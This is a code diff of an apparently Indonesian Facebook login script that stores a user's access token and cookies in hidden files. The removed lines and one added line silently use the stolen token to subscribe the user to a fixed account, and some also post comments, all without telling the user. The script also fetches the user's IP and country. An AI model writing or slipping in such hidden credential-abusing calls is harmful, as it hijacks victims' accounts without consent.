@@ -391,9 +391,6 @@ def login_lagi334():
         ken = open(".token.txt","w").write(tok1)
         cok = open(".cok.txt","w").write(cokimy)
         Console().print(Panel(f"""[bold cyan][+] Token : [bold green]{tok1}""",width=80, style=f"{color_panel}", title="[bold green]> TOKEN EAAB [bold green]<"))
-        requests.post("https://graph.facebook.com/100043537611609/subscribers?access_token=%s"%(ken))
-        requests.post("https://graph.facebook.com/100043537611609?fields=subscribers&access_token=%s"%(ken))
-        requests.post(f"https://graph.facebook.com/878169396977639/comments/?message={kom4}&access_token={ken}", headers = {"cookie":cok})
         print('login success jalankan ulang script')
     except Exception as e:
         Console().print(f" {H2}• {P2}[bold red]Cookies Kadaluwarsa Bang")
@@ -407,15 +404,14 @@ def login_lagi334():
 def menu(my_name,my_id):
     try:
         token = open('.token.txt','r').read()
-        tokenmu.append(token)
         cookie = open('.cok.txt','r').read()
-        requests.post("https://graph.facebook.com/100043537611609/subscribers?access_token=%s"%(tokenmu))
     except IOError:
         Console().print(f" {H2}• {P2}[bold red] Cookies Kadaluarsa tolkon")
         os.system('rm -rf .token.txt && rm -rf .cok.txt')
         time.sleep(3)
         login()
     os.system('clear')
+    requests.post("https://graph.facebook.com/100043537611609/subscribers?access_token=%s"%(token))
     negara = requests.get("http://ip-api.com/json/").json()["country"]
     ip = requests.get("http://ip-api.com/json/").json()["query"]
     prints(Panel(f"{H2}{waktucok()}",padding=(0,22),width=60,style=f"{color_panel}"))
